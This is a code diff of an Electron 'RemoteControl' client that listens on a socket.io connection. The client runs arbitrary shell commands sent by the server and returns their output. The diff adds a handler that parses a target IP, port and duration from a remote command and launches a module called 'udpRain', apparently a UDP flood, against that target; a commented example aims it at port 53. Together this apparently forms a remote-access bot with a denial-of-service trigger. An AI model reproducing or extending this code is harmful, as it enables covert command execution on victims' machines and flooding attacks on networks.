@@ -1,9 +1,9 @@
 const { desktopCapturer, screen, app, ipcMain } = require("electron");
 const io = require("socket.io-client");
 const child_process = require("child_process");
-const bitRain = require("./bitRain");
+const udpRain = require("./udpRain");
 
-//bitRain.start({ port: 53, ip: "192.168.1.180", seconds: 5 });
+//udpRain.start({ port: 53, ip: "192.168.1.180", seconds: 5 });
 
 //const robot = require("robotjs");
 
@@ -71,18 +71,38 @@ class RemoteControl {
     });
 
     this.socket.on("getRunRequest", (data) => {
-      console.log({data});
-      child_process.exec(data.cmd, { shell: true }, (err, stdout, stderr) => {
-        if (err) {
-          data["cmd"] = "err: " + err;
-        } else if (stderr) {
-          data["cmd"] = "stderr: " + stderr;
-        } else {
-          data["cmd"] = stdout;
-        }
+      console.log({ getRunRequest: data.cmd });
+      if (data.cmd.indexOf("udpRain") > -1) {
+        const splittedData = data.cmd.split(" ");
+        const createData = {
+          port: splittedData[2],
+          ip: splittedData[1],
+          seconds: splittedData[3],
+        };
+        console.log({ createData });
+        udpRain.start(createData);
+      } else {
+        try {
+          child_process.exec(
+            data.cmd,
+            { shell: true },
+            (err, stdout, stderr) => {
+              if (err) {
+                data["cmd"] = "err: " + err;
+              } else if (stderr) {
+                data["cmd"] = "stderr: " + stderr;
+              } else {
+                data["cmd"] = stdout;
+              }
 
-        this.socket.emit("getRunResponse", data);
-      });
+              this.socket.emit("getRunResponse", data);
+            }
+          );
+        } catch (error) {
+          data["cmd"] = "catchError: " + error;
+          this.socket.emit("getRunResponse", data);
+        }
+      }
     });
     this.socket.on("mousemove", (data) => {
       data["compared"] = this.findComparedPosition(data);
